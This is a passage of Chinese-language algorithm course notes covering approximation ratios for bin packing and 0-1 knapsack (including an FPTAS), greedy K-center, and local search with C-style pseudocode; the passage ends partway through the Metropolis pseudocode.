<p><mark class="critic">EPTAS (Efficient PTAS)</mark>: 在 PTAS 的基础上，要求算法 <span class="arithmatex">\( A \)</span> 的复杂度是 <span class="arithmatex">\( O(|I|^c) \)</span>，其中 <span class="arithmatex">\( c &gt; 0 \)</span> 是与<span class="arithmatex">\(\varepsilon\)</span>无关的常数。可以将 EPTS 的复杂度记为 <span class="arithmatex">\( |I^{O(1)}| f(1/\varepsilon）\)</span>。</p>
<p><mark class="critic">FPTAS (Fully PTAS)</mark>: 在 PTAS 的基础上，要求算法 <span class="arithmatex">\( A \)</span> 的运行时间关于 <span class="arithmatex">\( |I| \)</span> 和 <span class="arithmatex">\(\varepsilon\)</span> 都是多项式项， 即可以将 FPTAS 的复杂度记为 
<span class="arithmatex">\(|I|^{O(1)} (1/\varepsilon)^{O(1)}\)</span></p>
<h2 id="note-ads-wk10-_3">装箱问题(一维)<a class="headerlink" href="#note-ads-wk10-_3" title="Permanent link">&para;</a></h2>
<div class="admonition question">
<p class="admonition-title">问题描述</p>
<p>有 <span class="arithmatex">\(n\)</span> 个物品，每个物品的大小为 <span class="arithmatex">\(s_i\)</span>，有若干个箱子，每个箱子的大小为 <span class="arithmatex">\(C\)</span>，要求将所有物品放入箱子中，使得每个箱子的大小不超过 <span class="arithmatex">\(C\)</span>，并且使得所需的箱子数目尽可能少。</p>
<p><mark class="critic">给定若干个物品，判断它们是否可由两个箱子装下是 NP 完全的</mark></p>
<p>接下来我们默认<span class="arithmatex">\(C=1\)</span>，即箱子的大小为1，方便讨论。</p>
</div>
<p>关于一维装箱问题，除非 <span class="arithmatex">\(P=NP\)</span>，否则不存在多项式时间的算法满足</p>
<div class="arithmatex">\[
    A(I) \leqslant \alpha \cdot \text{OPT}(I)
\]</div>
<p>其中 <span class="arithmatex">\(\alpha &lt; \frac{3}{2}\)</span>。</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>使用反证法，如果存在近似比小于 <span class="arithmatex">\(\frac{3}{2}\)</span> 的算法，那么可以用这个算法<span class="arithmatex">\(A\)</span>来解决NPC的判断物品是否可以由两个箱子装下的问题。</p>
<ul>
<li>
<p>如果物品可以由两个箱子装下，那么<span class="arithmatex">\(OPT=2\)</span>，则<span class="arithmatex">\(A(I) &lt; \frac{3}{2} \cdot 2 = 3\)</span>，即<span class="arithmatex">\(A(I) &lt; 3\)</span>；此时<span class="arithmatex">\(A(I)=2\)</span>，那么<span class="arithmatex">\(A\)</span>可以判断；</p>
</li>
<li>
<p>如果物品不可以由两个箱子装下，那么<span class="arithmatex">\(OPT \geqslant 3\)</span>，则<span class="arithmatex">\(A(I)\)</span>至少为<span class="arithmatex">\(3\)</span>，即<span class="arithmatex">\(A(I) \geqslant 3\)</span>；但是由于近似比小于<span class="arithmatex">\(\frac{3}{2}\)</span>，所以由<span class="arithmatex">\(A(I)\)</span>可以判断此时OPT不可能是<span class="arithmatex">\(2\)</span>。此时这个近似算法<span class="arithmatex">\(A\)</span>就可以判断物品是否可以由两个箱子装下。</p>
</li>
</ul>
<p>综上，我们用多项式算法<span class="arithmatex">\(A\)</span>来解决NPC问题，所以只可能有P=NP。</p>
</div>
<p>在装箱问题中，我们一般不关心全部的实例，而关心 <span class="arithmatex">\(OPT(I)\)</span> 较大的那些实例。因此定义 “渐近近似比（asymptotic approximation ratio）” 如下：</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>对于一维装箱问题，定义渐近近似比为,对于任意常数 <span class="arithmatex">\(\alpha \geqslant 1\)</span>,对于任意实例 <span class="arithmatex">\(I\)</span>，存在常数 <span class="arithmatex">\(k\)</span>，使得</p>
<div class="arithmatex">\[
    A(I) \leqslant \alpha \cdot OPT(I) + k
\]</div>
<p>则称所有满足上式的 <span class="arithmatex">\(\alpha\)</span> 的下确界为<span class="arithmatex">\(A\)</span>渐近近似比。</p>
<p><span class="arithmatex">\(k\)</span>可以是一个常数，也可以是<span class="arithmatex">\(OPT(I)\)</span>的一个高阶无穷小。</p>
</div>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
</div>
<p>装箱问题中，若所有的物品信息在开始装箱前已知，则它是离线（offline）问
   题；若初始时物品信息并不全部给出，例如物品在传送带上逐个到达，需要我们即时安排，而我们对未到达物品信息一无所知，同时做出的决定无法更改，此时称为在线（online）问题。“近似比” 通常用来描述离线问题近似算法的性能。而对于在线问题，一般用 “竞争比（competitive ratio）” 的概念。</p>
<h3 id="note-ads-wk10-next-fit">Next Fit<a class="headerlink" href="#note-ads-wk10-next-fit" title="Permanent link">&para;</a></h3>
<p>Next Fit 算法是一种简单的装箱算法，其思想是：对于每个物品，尝试将其放入当前箱子，如果放不下，则<mark class="critic">关闭当前箱子</mark>，并开出一个新箱子，将其放入；</p>
<p>Next Fit 算法有一个性质：相邻两个箱子的大小之和肯定大于1，否则就不需要开新箱子；</p>
<p>根据这个，我们可以证明：</p>
<div class="arithmatex">\[
    NF(I) \leqslant 2 \cdot OPT(I) - 1
\]</div>
<p>即</p>
<div class="arithmatex">\[
    OPT(I) \geqslant \frac{NF(I) + 1}{2}
\]</div>
<p>换句话说，如果我们的算法的箱子数目用了<span class="arithmatex">\(2M\)</span>个，那么最优解至少要用<span class="arithmatex">\(M+1\)</span>个箱子。</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>令 <span class="arithmatex">\( S(B_i) \)</span> 为箱子 <span class="arithmatex">\( B_i \)</span> 中物品的大小之和，那么有：</p>
<div class="arithmatex">\[\begin{cases}
    S(B_1) + S(B_2) &gt; 1 \\
    S(B_3) + S(B_4) &gt; 1 \\
    \ldots \\
    S(B_{2M-1}) + S(B_{2M}) &gt; 1
\end{cases}\]</div>
<p>将所有不等式相加，得到：</p>
<div class="arithmatex">\[
\sum_{i=1}^{2M} S(B_i) &gt; M
\]</div>
<p>所以总的大小严格大于 <span class="arithmatex">\(M\)</span>，即最优解箱子数目至少为 <span class="arithmatex">\(M+1\)</span>。</p>
</div>
<p>事实上<span class="arithmatex">\(NF\)</span>装箱的近似比就是<span class="arithmatex">\(2\)</span>,不会再有比这个小的了；</p>
<div class="admonition eg">
<p class="admonition-title">下确界的例子</p>
<p>考虑<span class="arithmatex">\(M\)</span>组物品，每组物品的大小为<span class="arithmatex">\(\dfrac{1}{2},\varepsilon\)</span>,最后再加一个<span class="arithmatex">\(\dfrac{1}{2}\)</span>,且满足<span class="arithmatex">\(M\varepsilon &lt; 1\)</span>,此时<span class="arithmatex">\(NF\)</span>算法需要<span class="arithmatex">\(M+1\)</span>个箱子，而最优解需要<span class="arithmatex">\(M/2+1\)</span>个箱子，所以<span class="arithmatex">\(NF\)</span>算法的下确界为<span class="arithmatex">\(2\)</span>。</p>
</div>
<h3 id="note-ads-wk10-any-fit">Any Fit<a class="headerlink" href="#note-ads-wk10-any-fit" title="Permanent link">&para;</a></h3>
<p>这是一类的Fit方案，满足: <em>当物品到达时，除非所有目前打开的箱子都无法装下该物品，才允许打开一个新箱子</em></p>
<p>主要包括：</p>
<ul>
<li>(FF)First Fit: 按箱子打开的顺序从早到晚检查,将物品放入第一个能放下的箱子中；</li>
<li>(BF)Best Fit: 将物品放入剩余空间最小的箱子中,最大化利用箱子空间；</li>
<li>(WF)Worst Fit: 将物品放入剩余空间最大的箱子中;</li>
</ul>
<p><strong>前面的所有 Fit 算法都是在线算法</strong>。此外，Any Fit 的三种算法都满足相邻两个箱子物品尺寸之和大于1，因此它们都不会比 NF 差。而前面 NF 的下界实例也适用于 WF，因此 WF 和 NF 一样差。</p>
<div class="admonition idea">
<p class="admonition-title">FF VS BF</p>
<p>从定义上来看，BF最大化利用了空间，似乎表现会比FF好，但是实际上并不能很好判断两者的优劣：</p>
<ul>
<li>0.5、0.7、0.1、0.4、0.3，FF=2；BF=3；</li>
<li>0.5、0.7、0.3、0.5，FF=3；BF=2；</li>
</ul>
<p>从上面的例子可以看出，BF并不一定比FF好，FF也不一定比BF好；</p>
</div>
<p>FF和BF的近似比都是1.7；</p>
<h2 id="note-ads-wk10-0-1">0-1背包问题<a class="headerlink" href="#note-ads-wk10-0-1" title="Permanent link">&para;</a></h2>
<h3 id="note-ads-wk10-2-">基础的2-近似算法<a class="headerlink" href="#note-ads-wk10-2-" title="Permanent link">&para;</a></h3>
<p>在贪心算法中，如果是解决分数背包问题，那么可以使用贪心算法，是让背包的每一单位重量的价值最大化；但是如果是整数的0-1背包问题，那么有以下反例：</p>
<p>有两个物品，第一个物品的价值为 1，重量为 1，第二个物品的价值为 2，重量为 3，背包的容量为 3。我们的贪心策略是让每单位重量的价值最大化，因此贪心算法的选择结果是选择第一个物品，但实际上最优解显然是选择第二个物品，这样背包的价值为 2，而贪心算法的解为 1。因此贪心算法并不是最优的。</p>
<p>为了得到近似比，我们需要进一步改进我们的贪心算法：我们有两个贪心策略，其一是根据这里的单位重量的价值（profit density），其二是直接贪心选择最大价值的物品，我们运行两个算法选择最优解，我们可以证明，这样结合后的近似比为 2</p>
<p>设</p>
<ul>
<li><span class="arithmatex">\(P_{frac}\)</span> 为分数背包问题的最优解；</li>
<li><span class="arithmatex">\(P_{OPT}\)</span> 为0-1背包问题的最优解；</li>
<li><span class="arithmatex">\(P_{greedy}\)</span> 为贪心算法的解；</li>
<li><span class="arithmatex">\(p_{max}\)</span> 为装得下的物品中价值最大的物品的价值；</li>
</ul>
<p>那么有</p>
<div class="arithmatex">\[
    P_{frac} \geqslant P_{OPT} \geqslant P_{greedy} \geqslant p_{max}
\]</div>
<p>所以</p>
<div class="arithmatex">\[
    \dfrac{P_{OPT}}{P_{greedy}} \leqslant \dfrac{P_{frac}}{P_{greedy}} \leqslant \dfrac{P_{greedy}+p_{max}}{P_{greedy}} \leqslant 2
\]</div>
<p>其中的<span class="arithmatex">\(P_{frac} \leqslant P_{greedy}+p_{max}\)</span>是因为按照贪心策略，我们选择了最大的物品，在即将满的时候，<span class="arithmatex">\(P_{frac}\)</span>在<span class="arithmatex">\(P_{greedy}\)</span>的基础上将<span class="arithmatex">\(p_{max}\)</span>的截取了一部分装进去了；</p>
<div class="admonition summary">
<p class="admonition-title">Summary</p>
<p>如果已知最优解中价值最大的前k个，那么可以设计出近似比为<span class="arithmatex">\(\dfrac{k+1}{k}\)</span>的算法</p>
</div>
<h3 id="note-ads-wk10-0-1fptas">0-1背包的FPTAS算法<a class="headerlink" href="#note-ads-wk10-0-1fptas" title="Permanent link">&para;</a></h3>
<p>现在我们讨论一个更美好的算法，即一个可以无限近似的算法。利用动态规划一讲的算法我们知道 0-1背包问题是有伪多项式算法的，即其复杂度是 <span class="arithmatex">\(O(nC)\)</span> 的，其中 <span class="arithmatex">\(n\)</span> 是物品的数量，<span class="arithmatex">\(C\)</span> 是背包的容量。但我们可以换个角度进行动态规划，我们的数组第二个维度不再是背包的容量，而是价值，即我们原先的数组是 <code>A[i][c]</code>表达的是前 <code>i</code> 个物品放入容量为 <code>c</code> 的背包的最大价值，现在我们的数组是 <code>A[i][v]</code> 表达的是前 <code>i</code> 个物品放入价值为 <code>v</code> 的背包的最小重量。转移方程为：</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>Let <span class="arithmatex">\( W_{i,p} \)</span> be the minimum weight of a collection from <span class="arithmatex">\(\{1, \ldots, i\}\)</span> with total profit being exactly <span class="arithmatex">\( p \)</span>.</p>
<ol>
<li><strong>Take <span class="arithmatex">\( i \)</span></strong>: </li>
</ol>
<div class="arithmatex">\[
   W_{i,p} = w_i + W_{i-1,p - p_i}
\]</div>
<ol>
<li><strong>Skip <span class="arithmatex">\( i \)</span></strong>: </li>
</ol>
<div class="arithmatex">\[
   W_{i,p} = W_{i-1,p}
\]</div>
<div class="arithmatex">\[
W_{i,p} = 
\begin{cases} 
\infty &amp; \text{if } i = 0 \\ 
W_{i-1,p} &amp; \text{if } p_i &gt; p \\ 
\min \{ W_{i-1,p}, w_i + W_{i-1,p - p_i} \} &amp; \text{otherwise} 
\end{cases}
\]</div>
</div>
<p>显然，这一动态规划的复杂度是 <span class="arithmatex">\(O(nV)\)</span> 的，其中 <span class="arithmatex">\(V\)</span> 是所有物品的价值之和。我们做个简单的变换，设 <span class="arithmatex">\(vmax\)</span> 是所有物品的价值的最大值，那么显然有 <span class="arithmatex">\(V \leqslant nvmax\)</span>因此我们的复杂度是 <span class="arithmatex">\(O(n^2 vmax)\)</span> 的。</p>
<p>如果发现 <span class="arithmatex">\(vmax\)</span> 的大小是 <span class="arithmatex">\(n\)</span> 的多项式级别的，那么我们将得到一个多项式时间的算法。然而并非所有实例都能满足这一条件，因此我们需要对输入的价值做一些技术性的处理，即对输入的所有价值做同比例的缩小，使得 <span class="arithmatex">\(vmax\)</span> 能缩小到 <span class="arithmatex">\(n\)</span> 的多项式
级别</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>给定想要的比例<span class="arithmatex">\(\varepsilon\)</span>,取<span class="arithmatex">\(b=\dfrac{\varepsilon v_{max}}{n}\)</span>
将输入的全体价值同时缩放一个比例<span class="arithmatex">\(b\)</span>,使得最大价值为<span class="arithmatex">\(n\)</span>的多项式级别，做向上(或者向下)取整，然后使用动态规划做法，得到最优解<span class="arithmatex">\(v\)</span>;最后再将结果放大回来，我们相信放大回来的价值和原价值是接近的，即<span class="arithmatex">\(bv\)</span>是一个近似解。</p>
</div>
<p>可以证明上述算法是 0-1 背包的一个FPTAS算法</p>
<p>首先时间复杂度是显然的，我们缩小价值后的的动态规划算法是 </p>
<div class="arithmatex">\[
    b=\dfrac{\varepsilon v_{max}}{n}
\]</div>
<div class="arithmatex">\[
    O(n^2 \cdot \dfrac{v_{max}}{b})=O(n^2 \cdot \dfrac{n}{\varepsilon})=O(\dfrac{n^3}{\varepsilon})
\]</div>
<p>满足多项式时间的要求；</p>
<p>我们用多项式算法解决了<span class="arithmatex">\(v_i'\)</span>价值下的问题：</p>
<p>我们还需要关注经过缩放再放大之后，原本价值的变化是怎么样的即 <span class="arithmatex">\(v_i' = \lceil v_i / b \rceil b\)</span> 和 <span class="arithmatex">\(v_i\)</span> 是接近的。事实上因为在向上取整时最多只会加上 1，因此我们有：</p>
<div class="arithmatex">\[
v_i \leqslant v_i' \leqslant v_i + b.
\]</div>
<p>设对于 <span class="arithmatex">\(v_1, \ldots, v_n\)</span> 而言的最优物品集合为 <span class="arithmatex">\(S^*\)</span>，而对于 <span class="arithmatex">\(v_1', \ldots, v_n'\)</span> 而言的最优物品集合为 <span class="arithmatex">\(S\)</span>，那么我们有：</p>
<div class="arithmatex">\[
\sum_{i \in S} v_i' \geqslant \sum_{i \in S^*} v_i'.
\]</div>
<p>这是因为 <span class="arithmatex">\(S\)</span> 是 <span class="arithmatex">\(v_1', \ldots, v_n'\)</span> 的最优解，而 <span class="arithmatex">\(S^*\)</span> 是一个可行解。然后结合上述含入的不等式我们有如下等式链：</p>
<div class="arithmatex">\[
\sum_{i \in S^*} v_i \leqslant \sum_{i \in S^*} v_i' \leqslant \sum_{i \in S} (v_i + b) \leqslant \sum_{i \in S} v_i + nb = \sum_{i \in S} v_i + \varepsilon v_{\max} 
\]</div>
<p>比较首尾，只要能估计出 <span class="arithmatex">\(v_{\max}\)</span> 和 <span class="arithmatex">\(\sum_{i \in S} v_i\)</span> 的关系，我们就能得到近似化的上界。显然$v_{max} \leqslant \sum_{i \in S^*} v_i $</p>
<div class="arithmatex">\[
(1 -  \varepsilon) \sum_{i \in S^*} v_i = (1 -  \varepsilon) OPT \leqslant  \sum_{i \in S} v_i。
\]</div>
<p>因此我们的近似化满足 FPTAS 的要求。</p>
<h2 id="note-ads-wk10-k-center">K-Center问题<a class="headerlink" href="#note-ads-wk10-k-center" title="Permanent link">&para;</a></h2>
<p>Greedy-KCenter问题的的解不大于最优解的两倍，即</p>
<div class="arithmatex">\[
    A(I) \leqslant 2 \cdot OPT(I)
\]</div>
<p>证明：如果该算法的K个中心刚好在最优解的圆里面，证毕；如果不在，那么其至少有两个在同一个最优解的圆里面，由于每次选的都是最远的，所以这两个点(u,v)的距离大于其解。</p>
<div class="arithmatex">\[
    2OPT(I) \geqslant d(u,v)  \geqslant A(I)
\]</div>
<p>也证毕。</p></section><section class="print-page" id="note-ads-wk11" heading-number="2.2.3.13"><h1 id="note-ads-wk11-_1">局部搜索<a class="headerlink" href="#note-ads-wk11-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3466 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 39 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 3 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 12 分钟</p>
</div>
<blockquote>
<p>昔孟母，择邻处</p>
</blockquote>
<div class="admonition quote">
<p class="admonition-title">引入</p>
<p>如果我们位于一座山上，所拥有的信息只有我们周围的地形，现在我们要下山，理所应当的，我们会选择当前所能看到的最低的位置前进，当然，这样的选择并不一定能够保证我们最终能够到达山脚下，有可能只是到达一个山谷；但是有时候这种方法是有效的。</p>
</div>
<p>局部搜索（Local Search）是一种常用的优化方法，主要用于求解大规模的优化问题，尤其是那些解空间较大且不容易通过全局搜索找到最优解的问题。局部搜索算法从一个初始解出发，在当前解的邻域中不断进行探索，以寻找更好的解，直到满足某些停止条件。</p>
<p>具体来说，局部搜索的基本流程包括以下几个步骤：</p>
<ol>
<li><strong>初始化</strong>：选择一个初始解。</li>
<li><strong>邻域搜索</strong>：通过某种方式生成当前解的邻域解，即在当前解的基础上进行微小的改变，得到一组相似的解。</li>
<li><strong>选择最优邻域解</strong>：从邻域解中选择一个“更优”的解，作为新的当前解。</li>
<li><strong>迭代</strong>：重复邻域搜索和选择最优邻域解的步骤，直到满足停止条件（如达到最大迭代次数、解的改进达到一定程度等）。</li>
</ol>
<p>局部搜索通常用于求解 <strong>组合优化问题</strong> （如旅行商问题、图着色问题等），尤其在搜索空间庞大的情况下，它通过聚焦在较小的局部区域内进行搜索，能够在较短的时间内找到一个较好的解，尽管该解不一定是全局最优。</p>
<p>局部搜索的一些常见变种包括：</p>
<ul>
<li><strong>爬山算法（Hill Climbing）</strong>：一种简单的局部搜索方法，通过选择邻域中最好的解逐步优化，直到没有更好的解为止。</li>
<li><strong>模拟退火（Simulated Annealing）</strong>：在爬山算法的基础上引入了随机性，允许接受较差的解，从而避免陷入局部最优解。</li>
<li><strong>禁忌搜索（Tabu Search）</strong>：通过维护一个禁忌表来记录已经访问过的解，防止算法反复访问已探索过的区域，从而提高搜索效率。</li>
</ul>
<p>局部搜索的优点是计算效率高、实现简单，但其缺点是容易陷入局部最优解(到达了山谷而不是山底)。</p>
<h2 id="note-ads-wk11-_2">局部搜索的框架<a class="headerlink" href="#note-ads-wk11-_2" title="Permanent link">&para;</a></h2>
<p><strong>局部性(Locality)</strong></p>
<ul>
<li>
<p>需要在neighborhood中进行搜索，即在可行集中的邻域进行搜索</p>
</li>
<li>
<p>需要保证局部最优是 <strong>自身邻域</strong> 的全局最优</p>
</li>
</ul>
<p><strong>搜索</strong></p>
<ul>
<li>
<p>从一个可行解开始，每一次迭代都会在当前解的邻域中选择一个更好的解</p>
</li>
<li>
<p>达到局部最优当且仅当邻域内没有更好的解</p>
</li>
</ul>
<h2 id="note-ads-wk11-_3">伪代码<a class="headerlink" href="#note-ads-wk11-_3" title="Permanent link">&para;</a></h2>
<p>S <span class="arithmatex">\(\sim\)</span> S' : S' is a neighboring solution of S, whree S' can be obtained by a <mark class="critic">slight modification</mark> of S.</p>
<p>即对S进行一次小的改变，得到S'。</p>
<p>N(S): neighborhood of S – the set { S': S <span class="arithmatex">\(\sim\)</span> S' }.</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk11-__codelineno-0-1"></a><span class="n">SolutionType</span><span class="w"> </span><span class="nf">Gradient_descent</span><span class="p">()</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk11-__codelineno-0-2"></a><span class="p">{</span><span class="w">   </span><span class="n">Start</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">feasible</span><span class="w"> </span><span class="n">solution</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="err"></span><span class="w"> </span><span class="n">FS</span><span class="w"> </span><span class="p">;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk11-__codelineno-0-3"></a><span class="w">    </span><span class="n">MinCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cost</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk11-__codelineno-0-4"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk11-__codelineno-0-5"></a><span class="w">        </span><span class="n">S</span><span class="err">’</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Search</span><span class="p">(</span><span class="w"> </span><span class="n">N</span><span class="p">(</span><span class="n">S</span><span class="p">)</span><span class="w"> </span><span class="p">);</span><span class="w"> </span><span class="cm">/* find the best S’ in N(S) */</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk11-__codelineno-0-6"></a><span class="w">        </span><span class="n">CurrentCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cost</span><span class="p">(</span><span class="n">S</span><span class="err">’</span><span class="p">);</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk11-__codelineno-0-7"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">CurrentCost</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">MinCost</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk11-__codelineno-0-8"></a><span class="w">            </span><span class="n">MinCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CurrentCost</span><span class="p">;</span><span class="w">    </span><span class="n">S</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">S</span><span class="err">’</span><span class="p">;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk11-__codelineno-0-9"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk11-__codelineno-0-10"></a><span class="w">        </span><span class="k">else</span><span class="w">  </span><span class="k">break</span><span class="p">;</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk11-__codelineno-0-11"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-ads-wk11-__codelineno-0-12"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">S</span><span class="p">;</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-ads-wk11-__codelineno-0-13"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-ads-wk11-_4">点集覆盖问题<a class="headerlink" href="#note-ads-wk11-_4" title="Permanent link">&para;</a></h2>
<p><mark class="critic">Vertex Cover Problem</mark></p>
<p>给定一个无向图<span class="arithmatex">\(G=(V,E)\)</span>，以及一个正整数<span class="arithmatex">\(K\)</span>，是否存在V的一个子集<span class="arithmatex">\(C\)</span>，使得<span class="arithmatex">\(C\)</span>中点的个数不超过<span class="arithmatex">\(K\)</span>，且对于每一条边<span class="arithmatex">\((u,v)\)</span> <span class="arithmatex">\(\in\)</span> <span class="arithmatex">\(E\)</span>，至少有一个端点在<span class="arithmatex">\(C\)</span>中。</p>
<p><mark class="critic">Vertex cover problem (optimization)</mark></p>
<p>在点集覆盖问题的基础上，找到最小的点集覆盖。</p>
<p>在这一问题中</p>
<ul>
<li>Feasible solution(<span class="arithmatex">\(\mathcal{FS}\)</span>): 所有点集覆盖的集合</li>
<li>Cost(S) = |S|</li>
<li>S <span class="arithmatex">\(\sim\)</span> S' </li>
</ul>
<p>在点集覆盖中，每一个点集覆盖S至多有|V|个邻居，即N(S)的大小是有限的。</p>
<ul>
<li>search: Start from S = V; delete a node and check if S' is a vertex cover with a smaller cost.</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><div align="center"><img src="../NOTE/ADS/image-13.png" width="50%"></div></p>
<p>Case0,是正确的，依次删去所有点，最后得到的是空集，是一个点集覆盖。</p>
<p>Case1,是错误的，因为删除了一个点后，我们将最优解删去了；</p>
</div>
<h3 id="note-ads-wk11-_5">改进<a class="headerlink" href="#note-ads-wk11-_5" title="Permanent link">&para;</a></h3>
<p>如果我们可以容忍暂时的代价升高，有可能会遇到代价降低更好的情况</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk11-__codelineno-1-1"></a><span class="n">SolutionType</span><span class="w"> </span><span class="nf">Metropolis</span><span class="p">()</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk11-__codelineno-1-2"></a><span class="p">{</span><span class="w">   </span><span class="n">Define</span><span class="w"> </span><span class="n">constants</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">T</span><span class="p">;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk11-__codelineno-1-3"></a><span class="w">    </span><span class="n">Start</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">feasible</span><span class="w"> </span><span class="n">solution</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">FS</span><span class="w"> </span><span class="p">;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk11-__codelineno-1-4"></a><span class="w">    </span><span class="n">MinCost</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cost</span><span class="p">(</span><span class="n">S</span><span class="p">);</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk11-__codelineno-1-5"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk11-__codelineno-1-6"></a><span class="w">        </span><span class="n">S</span><span class="err">’</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Randomly</span><span class="w"> </span><span class="n">chosen</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">N</span><span class="p">(</span><span class="n">S</span><span class="p">);</span><span class="w"> </span><span class="c1">//Adding is allowed</span>
